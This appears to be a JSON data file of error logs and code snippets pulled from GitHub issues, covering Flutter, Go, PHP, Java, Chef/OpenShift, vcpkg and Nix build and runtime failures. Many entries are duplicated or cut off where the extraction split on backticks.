        "logs": "`\r\nE/flutter ( 2658): [ERROR:topaz/lib/tonic/logging/dart_error.cc(16)] Unhandled exception:\r\nE/flutter ( 2658): type '_InternalLinkedHashMap<String, dynamic>' is not a subtype of type 'Iterable<dynamic>' in type cast where\r\nE/flutter ( 2658):   _InternalLinkedHashMap is from dart:collection\r\nE/flutter ( 2658):   String is from dart:core\r\nE/flutter ( 2658):   Iterable is from dart:core\r\n"
    },
    {
        "logs": "```\r\nE/flutter ( 2658): [ERROR:topaz/lib/tonic/logging/dart_error.cc(16)] Unhandled exception:\r\nE/flutter ( 2658): type '_InternalLinkedHashMap<String, dynamic>' is not a subtype of type 'Iterable<dynamic>' in type cast where\r\nE/flutter ( 2658):   _InternalLinkedHashMap is from dart:collection\r\nE/flutter ( 2658):   String is from dart:core\r\nE/flutter ( 2658):   Iterable is from dart:core\r\n"
    },
    {
        "logs": "`\r\nTraceback (most recent call last):\r\n  File \"segrnn-argid.py\", line 98, in <module>\r\n    wvs = get_wvec_map()\r\n  File \"/Users/username_0/code/huggingface/open-sesame/src/dataio.py\", line 276, in get_wvec_map\r\n    raise Exception(\"word vector file not found!\", FILTERED_WVECS_FILE)\r\nException: ('word vector file not found!', '../data/glove.6B.100d.framenet.txt')\r\n"
    },
    {
        "logs": "`\r\n...\r\n[2173/7974] Failed to download http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: Get http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: dial tcp [2a02:2e0:3fe:1001:7777:772e:2:85]:80: i/o timeout                                                                                              \r\n[2174/7974] Downloaded http://www.fky.org/restaurierung/Klabunde/Lacke.htm                                                                          \r\n[2175/7974] Downloaded http://yakamo.org/?p=1506                                                                                                    \r\n[2176/7974] Downloaded http://www.kaspersky.com/antivirus-removal-tool?form=1\r\npanic: sync: WaitGroup is reused before previous Wait has returned\r\n\r\ngoroutine 1237523 [running]:\r\nsync.(*WaitGroup).Wait(0xc00586f578)                                                                                                                 \r\n        /nix/store/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee-go-1.12.9/share/go/src/sync/waitgroup.go:132 +0xae                                                                   \r\ngithub.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver.func1(0xc00586f560)                                                                     \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:39 +0x3e                                                                        \r\ncreated by github.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver                                                                              \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:37 +0x54                                                                        \r\n"
    },
    {
        "logs": "```\r\n...\r\n[2173/7974] Failed to download http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: Get http://www.heise.de/newsticker/meldung/l-f-Praepariertes-Mini-Fladenbrot-spaeht-geheime-Krypto-Schluessel-aus-2721449.html?wt_mc=rss.ho.beitrag.atom: dial tcp [2a02:2e0:3fe:1001:7777:772e:2:85]:80: i/o timeout                                                                                              \r\n[2174/7974] Downloaded http://www.fky.org/restaurierung/Klabunde/Lacke.htm                                                                          \r\n[2175/7974] Downloaded http://yakamo.org/?p=1506                                                                                                    \r\n[2176/7974] Downloaded http://www.kaspersky.com/antivirus-removal-tool?form=1\r\npanic: sync: WaitGroup is reused before previous Wait has returned\r\n\r\ngoroutine 1237523 [running]:\r\nsync.(*WaitGroup).Wait(0xc00586f578)                                                                                                                 \r\n        /nix/store/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee-go-1.12.9/share/go/src/sync/waitgroup.go:132 +0xae                                                                   \r\ngithub.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver.func1(0xc00586f560)                                                                     \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:39 +0x3e                                                                        \r\ncreated by github.com/go-shiori/shiori/pkg/warc/internal/archiver.(*Archiver).StartArchiver                                                                              \r\n        /build/go/src/github.com/go-shiori/shiori/pkg/warc/internal/archiver/archiver.go:37 +0x54                                                                        \r\n"
    },
    {
        "logs": "`\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/course/CourseMaterialsView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  25     Function app\\views\\course\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  25     Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  138    Function add_files not found.\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/grading/ElectronicGraderView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  842    Function app\\views\\grading\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  842    Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  874    Function add_files not found.\r\n  875    Function add_files not found.\r\n  876    Function add_files not found.\r\n  877    Function add_files not found.\r\n ------ -------------------------------------------------------------------------------\r\n"
    },
    {
        "logs": "```\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/course/CourseMaterialsView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  25     Function app\\views\\course\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  25     Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  138    Function add_files not found.\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  Line   views/grading/ElectronicGraderView.php\r\n ------ ----------------------------------------------------------------------------------------------------------\r\n  842    Function app\\views\\grading\\add_files not found while trying to analyse it - autoloading is probably not\r\n         configured properly.\r\n  842    Inner named functions are not supported by PHPStan. Consider refactoring to an anonymous function, class\r\n         method, or a top-level-defined function. See issue #165 (https://github.com/phpstan/phpstan/issues/165)\r\n         for more details.\r\n  874    Function add_files not found.\r\n  875    Function add_files not found.\r\n  876    Function add_files not found.\r\n  877    Function add_files not found.\r\n ------ -------------------------------------------------------------------------------\r\n"
    },
    {
        "logs": "`\r\n\r\n**Expected behavior**\r\n1. The test should pass without warning\r\n2. A new recording entry should be generated.\r\n\r\n**Environment summary**\r\nInstall Method (e.g. pip, interactive script, apt-get, Docker, MSI, edge build) / CLI version ("
    },
    {
        "logs": "`js\r\nclient.player.getQueue(guildID).on('songError', (errMessage, song) => {\r\n    if(errMessage === 'VideoUnavailable')\r\n        message.channel.send("
    },
    {
        "logs": "```js\r\nclient.player.getQueue(guildID).on('songError', (errMessage, song) => {\r\n    if(errMessage === 'VideoUnavailable')\r\n        message.channel.send(`Could not play **${song.name}** - The song was Unavailable, skipping...`);\r\n    else message.channel.send(`Could not play ${song.name} - ${errMessage}.`);\r\n});\r\n"
    },
    {
        "logs": "` log\r\nerror: Dynamically imported module evaluation is still pending but there are no pending ops. This situation is often caused by unresolved promise.\r\nerror Command failed with exit code 1.\r\n"
    },
    {
        "logs": "``` log\r\nerror: Dynamically imported module evaluation is still pending but there are no pending ops. This situation is often caused by unresolved promise.\r\nerror Command failed with exit code 1.\r\n"
    },
    {
        "logs": "`\r\n  In src/file.cr:822:18\r\n  \r\n   822 | io = PReader.new(self, offset, bytesize)\r\n                      ^--\r\n  Error: no overload matches 'File::PReader.new' with types File, Int32, Int32\r\n"
    },
    {
        "logs": "`\r\nERROR: Executing: ClusterAnalysis \"C:\\Data\\Defense Solutions\\solutions-geoproces\r\nsing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\" \"500\r\n Unknown\" \"C:\\Data\\Defense Solutions\\solutions-geoprocessing-toolbox\\utils\\test\\\r\npatterns_tests\\data\\scratch.gdb\\outputClusters\"\r\nStart Time: Tue Dec 22 13:11:43 2015\r\nExecuting (Copy Features): CopyFeatures \"C:\\Data\\Defense Solutions\\solutions-geo\r\nprocessing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\r\n\" C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cluster # 0 0 0\r\nStart Time: Tue Dec 22 13:11:46 2015\r\nERROR 000210: Cannot create output C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cl\r\nuster\r\nFailed to execute (Copy Features).\r\nFailed at Tue Dec 22 13:11:48 2015 (Elapsed Time: 1.76 seconds)\r\n"
    },
    {
        "logs": "```\r\nERROR: Executing: ClusterAnalysis \"C:\\Data\\Defense Solutions\\solutions-geoproces\r\nsing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\" \"500\r\n Unknown\" \"C:\\Data\\Defense Solutions\\solutions-geoprocessing-toolbox\\utils\\test\\\r\npatterns_tests\\data\\scratch.gdb\\outputClusters\"\r\nStart Time: Tue Dec 22 13:11:43 2015\r\nExecuting (Copy Features): CopyFeatures \"C:\\Data\\Defense Solutions\\solutions-geo\r\nprocessing-toolbox\\utils\\test\\patterns_tests\\data\\IncidentAnalysis.gdb\\Incidents\r\n\" C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cluster # 0 0 0\r\nStart Time: Tue Dec 22 13:11:46 2015\r\nERROR 000210: Cannot create output C:\\Users\\juds5059\\AppData\\Local\\Temp\\\\copy_cl\r\nuster\r\nFailed to execute (Copy Features).\r\nFailed at Tue Dec 22 13:11:48 2015 (Elapsed Time: 1.76 seconds)\r\n"
    },
    {
        "logs": "`\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.peekKey()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.pollElement()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.peekElement()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.clear()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.isEmpty()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.insert(Number, Integer)\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.ensureCapacity(int)\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.getSize()\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: The type IntDoubleBinHeap must implement the inherited abstract method BinHeapWrapper<Number,Integer>.update(Number, Integer)\r\nerror: graphhopper/core/src/main/java/com/graphhopper/coll/IntDoubleBinHeap.java:23: OTPIntDoubleBinHeap cannot be resolved to a type\r\n"
    },
    {
        "logs": "`\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:20: The import javax.xml.stream cannot be resolved\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:21: The import javax.xml.stream cannot be resolved\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:22: The import javax.xml.stream cannot be resolved\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:35: XMLStreamReader cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:35: XMLStreamException cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:47: XMLStreamReader cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:47: XMLStreamException cannot be resolved to a type\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:50: XMLStreamConstants cannot be resolved to a variable\r\nerror: graphhopper/core/src/main/java/com/graphhopper/reader/OSMFileHeader.java:52: XMLStreamConstants cannot be resolved to a variable\r\n"
    },
    {
        "logs": "`\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:148: The method poll_element() is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:175: The method insert_(double, int) is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:183: The method update_(double, int) is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:193: The method peek_element() is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:197: The method poll_element() is undefined for the type IntDoubleBinHeap\r\nerror: graphhopper/core/src/main/java/com/graphhopper/routing/DijkstraOneToMany.java:241: The method getCapacity() is undefined for the type IntDoubleBinHeap\r\n"
    },
    {
        "logs": "`\r\n         * iptables_rule[firewall_certificate] action enable\r\n           * template[/etc/iptables.d/firewall_certificate] action create\r\n             - create new file /etc/iptables.d/firewall_certificate\r\n             - update content in file /etc/iptables.d/firewall_certificate from none to 58bfcf\r\n             --- /etc/iptables.d/firewall_certificate\t2018-12-19 13:16:09.613963052 +0000\r\n             +++ /etc/iptables.d/.chef-firewall_certificate20181219-16012-5vaw84\t2018-12-19 13:16:09.613963052 +0000\r\n             @@ -1 +1,2 @@\r\n             +-A OS_FIREWALL_ALLOW -m state --state NEW,ESTABLISHED -m comment --comment \"OpenShift HTTPD\" -m tcp -p tcp --dport 9999 -j ACCEPT\r\n             - change mode from '' to '0644'\r\n             - restore selinux security context\r\n         \r\n         * cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server] action install\r\n           * yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] action install\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             ================================================================================\r\n             Error executing action "
    },
    {
        "logs": "` on resource 'yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs]'\r\n             ================================================================================\r\n             \r\n             Chef::Exceptions::Package\r\n             -------------------------\r\n             No candidate version available for tuned-profiles-origin-node\r\n             \r\n             Resource Declaration:\r\n             ---------------------\r\n             # In /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb\r\n             \r\n       61:     yum_package pkg_master_to_install.reject { |x| x == \"tuned-profiles-#{node['cookbook-openshift3']['openshift_service_type']}-node\" && node['cookbook-openshift3']['control_upgrade_version'].to_i >= 39 } do\r\n       62:       action :install\r\n       63:       version Array.new(pkg_master_to_install.size, version) unless version.nil?\r\n       64:       options new_resource.options.nil? ? node['cookbook-openshift3']['openshift_yum_options'] : new_resource.options\r\n       65:       notifies :run, 'execute[daemon-reload]', :immediately\r\n       66:       not_if { node['cookbook-openshift3']['deploy_containerized'] || (is_certificate_server && node['fqdn'] != first_master['fqdn']) }\r\n       67:       retries 3\r\n       68:     end\r\n       69: \r\n             \r\n             Compiled Resource:\r\n             ------------------\r\n             # Declared in /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb:61:in "
    },
    {
        "logs": "```\r\n         * iptables_rule[firewall_certificate] action enable\r\n           * template[/etc/iptables.d/firewall_certificate] action create\r\n             - create new file /etc/iptables.d/firewall_certificate\r\n             - update content in file /etc/iptables.d/firewall_certificate from none to 58bfcf\r\n             --- /etc/iptables.d/firewall_certificate\t2018-12-19 13:16:09.613963052 +0000\r\n             +++ /etc/iptables.d/.chef-firewall_certificate20181219-16012-5vaw84\t2018-12-19 13:16:09.613963052 +0000\r\n             @@ -1 +1,2 @@\r\n             +-A OS_FIREWALL_ALLOW -m state --state NEW,ESTABLISHED -m comment --comment \"OpenShift HTTPD\" -m tcp -p tcp --dport 9999 -j ACCEPT\r\n             - change mode from '' to '0644'\r\n             - restore selinux security context\r\n         \r\n         * cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server] action install\r\n           * yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] action install\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             * No candidate version available for tuned-profiles-origin-node\r\n             ================================================================================\r\n             Error executing action `install` on resource 'yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs]'\r\n             ================================================================================\r\n             \r\n             Chef::Exceptions::Package\r\n             -------------------------\r\n             No candidate version available for tuned-profiles-origin-node\r\n             \r\n             Resource Declaration:\r\n             ---------------------\r\n             # In /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb\r\n             \r\n       61:     yum_package pkg_master_to_install.reject { |x| x == \"tuned-profiles-#{node['cookbook-openshift3']['openshift_service_type']}-node\" && node['cookbook-openshift3']['control_upgrade_version'].to_i >= 39 } do\r\n       62:       action :install\r\n       63:       version Array.new(pkg_master_to_install.size, version) unless version.nil?\r\n       64:       options new_resource.options.nil? ? node['cookbook-openshift3']['openshift_yum_options'] : new_resource.options\r\n       65:       notifies :run, 'execute[daemon-reload]', :immediately\r\n       66:       not_if { node['cookbook-openshift3']['deploy_containerized'] || (is_certificate_server && node['fqdn'] != first_master['fqdn']) }\r\n       67:       retries 3\r\n       68:     end\r\n       69: \r\n             \r\n             Compiled Resource:\r\n             ------------------\r\n             # Declared in /tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb:61:in `block in class_from_file'\r\n             \r\n             yum_package(\"origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs\") do\r\n        package_name [\"origin-master\", \"origin-clients\", \"origin\", \"origin-node\", \"tuned-profiles-origin-node\", \"origin-sdn-ovs\"]\r\n        action [:install]\r\n        default_guard_interpreter :default\r\n        declared_type :yum_package\r\n        cookbook_name \"cookbook-openshift3\"\r\n        version [\"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\", \"3.9.0-1.el7.git.0.ba7faec\"]\r\n        retries 3\r\n        options []\r\n        not_if { #code block }\r\n             end\r\n             \r\n             System Info:\r\n             ------------\r\n             chef_version=14.8.12\r\n             platform=centos\r\n             platform_version=7.4.1708\r\n             ruby=ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux]\r\n             program_name=/opt/chef/bin/chef-client\r\n             executable=/opt/chef/bin/chef-client\r\n             \r\n           \r\n           ================================================================================\r\n           Error executing action `install` on resource 'cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server]'\r\n           ================================================================================\r\n           \r\n           Chef::Exceptions::Package\r\n           -------------------------\r\n           yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] (/tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb line 61) had an error: Chef::Exceptions::Package: No candidate version available for tuned-profiles-origin-node\r\n[Truncated]\n           chef_version=14.8.12\r\n           platform=centos\r\n           platform_version=7.4.1708\r\n           ruby=ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux]\r\n           program_name=/opt/chef/bin/chef-client\r\n           executable=/opt/chef/bin/chef-client\r\n           \r\n       Recipe: iptables::default\r\n         * execute[rebuild-iptables] action run\r\n           - execute /usr/sbin/rebuild-iptables\r\n       \r\n       Running handlers:\r\n       [2018-12-19T13:16:16+00:00] ERROR: Running exception handlers\r\n       Running handlers complete\r\n       [2018-12-19T13:16:16+00:00] ERROR: Exception handlers complete\r\n       Chef Client failed. 35 resources updated in 01 minutes 58 seconds\r\n       [2018-12-19T13:16:16+00:00] FATAL: Stacktrace dumped to /tmp/vagrant-cache/chef/chef-stacktrace.out\r\n       [2018-12-19T13:16:16+00:00] FATAL: Please provide the contents of the stacktrace.out file if you file a bug report\r\n       [2018-12-19T13:16:16+00:00] FATAL: Chef::Exceptions::Package: cookbook_openshift3_openshift_master_pkg[Install OpenShift Master Packages for Certificate Server] (cookbook-openshift3::certificate_server line 20) had an error: Chef::Exceptions::Package: yum_package[origin-master, origin-clients, origin, origin-node, tuned-profiles-origin-node, origin-sdn-ovs] (/tmp/vagrant-cache/chef/cookbooks/cookbook-openshift3/resources/openshift_master_pkg.rb line 61) had an error: Chef::Exceptions::Package: No candidate version available for tuned-profiles-origin-node\r\n"
    },
    {
        "logs": "`\r\n$ ./vcpkg/vcpkg install breakpad\r\nThe following packages will be built and installed:\r\n    breakpad[core]:x64-osx\r\n  * libdisasm[core]:x64-osx\r\nAdditional packages (*) will be modified to complete this operation.\r\nStarting package 1/2: libdisasm:x64-osx\r\nBuilding package libdisasm[core]:x64-osx...\r\n-- Downloading https://sourceforge.net/projects/bastard/files/libdisasm/0.23/libdisasm-0.23.tar.gz...\r\n-- Extracting source /Users/buccim2/Development/Squally/src/vcpkg/downloads/libdisasm-0.23.tar.gz\r\n-- Applying patch /Users/buccim2/Development/Squally/src/vcpkg/ports/libdisasm/sizeofvoid.patch\r\n-- Configuring x64-osx-dbg\r\n-- Configuring x64-osx-rel\r\n-- Building x64-osx-dbg\r\n-- Building x64-osx-rel\r\n-- Installing: /Users/buccim2/Development/Squally/src/vcpkg/packages/libdisasm_x64-osx/share/libdisasm/copyright\r\n-- Performing post-build validation\r\n-- Performing post-build validation done\r\nBuilding package libdisasm[core]:x64-osx... done\r\nInstalling package libdisasm[core]:x64-osx...\r\nInstalling package libdisasm[core]:x64-osx... done\r\nElapsed time for package libdisasm:x64-osx: 4.215 s\r\nStarting package 2/2: breakpad:x64-osx\r\nBuilding package breakpad[core]:x64-osx...\r\n-- Downloading https://github.com/google/breakpad/archive/54fa71efbe50fb2b58096d871575b59e12edba6d.tar.gz...\r\n-- Extracting source /Users/buccim2/Development/Squally/src/vcpkg/downloads/google-breakpad-54fa71efbe50fb2b58096d871575b59e12edba6d.tar.gz\r\n-- Using source at /Users/buccim2/Development/Squally/src/vcpkg/buildtrees/breakpad/src/9e12edba6d-12269dd01c\r\n-- Configuring x64-osx-dbg\r\n-- Configuring x64-osx-rel\r\n-- Building x64-osx-dbg\r\n-- Building x64-osx-rel\r\n-- Installing: /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/share/breakpad/copyright\r\n-- Performing post-build validation\r\nThere should be no empty directories in /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx\r\nThe following empty directories were found:\r\n\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/Breakpad.xcodeproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/gcov\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/handler/minidump_test.xcodeproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/da.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/de.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/English.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/es.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/fr.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/it.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/ja.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/nl.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/no.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/sl.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/sv.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/sender/tr.lproj\r\n    /Users/buccim2/Development/Squally/src/vcpkg/packages/breakpad_x64-osx/include/client/mac/testapp/English.lproj\r\n\r\nIf a directory should be populated but is not, this might indicate an error in the portfile.\r\nIf the directories are not needed and their creation cannot be disabled, use something like this in the portfile to remove them:\r\n\r\n    file(REMOVE_RECURSE ${CURRENT_PACKAGES_DIR}/a/dir ${CURRENT_PACKAGES_DIR}/some/other/dir)\r\n\r\n\r\nFound 1 error(s). Please correct the portfile:\r\n    /Users/buccim2/Development/Squally/src/vcpkg/ports/breakpad/portfile.cmake\r\n-- Performing post-build validation done\r\nError: Building package breakpad:x64-osx failed with: POST_BUILD_CHECKS_FAILED\r\nPlease ensure you're using the latest portfiles with "
    },
    {
        "logs": "`, then\r\nsubmit an issue at https://github.com/Microsoft/vcpkg/issues including:\r\n  Package: breakpad:x64-osx\r\n  Vcpkg version: 2018.11.23-501abecda7b9997d4492a08114b0a94e78b46007\r\n"
    },
    {
        "logs": "`.\r\n\r\nThat approach has the advantage of keeping the environment clean and only changing the PATH. The disadvantage is that it is messing a "
    },
    {
        "logs": "` equivalent.\n<issue_comment>username_0: Thank you for providing this context to us. I think you are doing a great job as an educator!\r\n\r\nI don't understand why I see the use of \""
    },
    {
        "logs": "`\" a lot in my current research on flakes. \"Your [shared investigation on NixFlakes](https://username_1.com/NixFlakes/) in understandable terms might be a good place for clarification\", my intution alleges.\r\n\r\nThere are ongoing caveats about building development shells to which I'd like to corss reference. The quid of the issue is that historically, ["
    },
    {
        "logs": "` has conflated two similar but separated use cases](https://github.com/NixOS/nix/pull/3833#issuecomment-660990812). Hence, any implementation of the current "
    },
    {
        "logs": "` use cases will gain traction, as devops team leaders seek to deploy reproducable dev environments to their team. Or normatively put: DevOps teems should be able to leverage nix for their distribution of developmemt environments through a a high quality UX.\n<issue_comment>username_1: I agree that getting this right could make a big difference. Now the question is, what is the right design :-D Nix flakes still has a lot of room to grow in terms of usability, as a whole.\r\n\r\nIf you have other ideas, I am happy to read about them and tell you if they are practical or not.\n<issue_comment>username_0: I think it boils down to properly scope and name two commands:\r\n\r\n- one, that does provide a dev environment for the application developer.\r\n- one that provides a debugging environment for the nix packager.\r\n\r\nOut of nowhere, "
    },
    {
        "logs": "`\r\n        private static readonly DateTime MIN_TIMESTAMP_UTC_KIND = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);\r\n\r\n        /// <summary>\r\n        /// Last time an error message was registered due to overflowing in-memory buffer.\r\n        /// </summary>\r\n        private DateTime _maxBufferTimeStamp = MIN_TIMESTAMP_UTC_KIND;\r\n\r\n        /// <summary>\r\n        /// Minimum interval in minutes between two error messages on in-memory buffer overflow.\r\n        /// </summary>\r\n        const double MAX_BUFFER_TIMEDIFF = 5;\r\n"
    },
    {
        "logs": "`\r\n        private void AddSingleMessage(string message, DateTime? timestamp)\r\n        {\r\n            DateTime timestampNn = timestamp ?? DateTime.Now;\r\n\r\n            if (_pendingMessageQueue.Count > _config.MaxQueuedMessages)\r\n            {\r\n                if (_maxBufferTimeStamp.AddMinutes(MAX_BUFFER_TIMEDIFF) < DateTime.UtcNow)\r\n                {\r\n                    if (_maxBufferTimeStamp == MIN_TIMESTAMP_UTC_KIND)\r\n                    {\r\n                        string errorMessage = $\"The AWS Logger in-memory buffer has reached maximum capacity of {_config.MaxQueuedMessages:N0} entries. Currently contains {_pendingMessageQueue.Count:N0} entries.\";\r\n                        LogLibraryServiceError(new System.InvalidOperationException(message));\r\n                        _pendingMessageQueue.Enqueue(new InputLogEvent\r\n                        {\r\n                            Timestamp = timestampNn,\r\n                            Message = errorMessage\r\n                        });\r\n                    }\r\n                    _maxBufferTimeStamp = DateTime.UtcNow;\r\n                }\r\n            }\r\n\r\n            _pendingMessageQueue.Enqueue(new InputLogEvent\r\n            {\r\n                Timestamp = timestampNn,\r\n                Message = message,\r\n            });\r\n        }\r\n"
    },
    {
